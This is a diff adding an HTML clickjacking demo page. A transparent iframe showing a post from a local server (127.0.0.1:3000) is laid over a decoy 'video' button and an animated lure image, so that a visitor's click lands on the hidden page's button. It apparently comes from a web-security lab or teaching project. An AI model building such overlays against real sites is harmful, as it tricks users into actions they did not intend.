@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<head>
+  <meta charset="utf-8">
+  <title>CLICK JACK!!!</title>
+  <style>
+    iframe {
+      /* Use absolute positioning to line up update button with fake button */
+      position: absolute;
+      z-index: 2;
+      /* Hide from view */
+      opacity: 0;
+    }
+
+    @keyframes mymove
+    {
+      from {top:200px;}
+      30% {top: 180px;}
+      50% {top: 200px;}
+      80% {top: 220px;}
+      to {top:200px;}
+    }
+
+    @-webkit-keyframes mymove /*Safari and Chrome*/
+    {
+      from {top:200px;}
+      30% {top: 180px;}
+      50% {top: 200px;}
+      80% {top: 220px;}
+      to {top:200px;}
+    }
+    button {
+      position: absolute;
+      top: 10px;
+      left: 10px;
+      z-index: 1;
+      width: 120px;
+    }
+    .image-attack {
+      animation:mymove 1s infinite;
+      -webkit-animation:mymove 1s infinite; /*Safari and Chrome*/
+      position: absolute;
+      top: 200px;
+      left: 300px;
+      width: 400px;
+      height: 200px;
+    }
+    .button-click {
+      position: absolute;
+      top: 560px;
+      left: 300px;
+      width: 70px;
+      height: 30px;
+      line-height: 30px;
+      text-align: center;
+      background-color: red;
+      color: #fff;
+    }
+  </style>
+</head>
+<body>
+<div style="height: 800px;width: 1000px;">
+  <img class="image-attack" src="img/clickAttack.jpeg">
+  <button class="button-click">视频>></button>
+  <iframe width="1000" height="800" src="http://127.0.0.1:3000/posts/5b9d21bb40184a2e66db7ec6" scrolling="no"></iframe>
+</div>
+</body>
+
+</html>
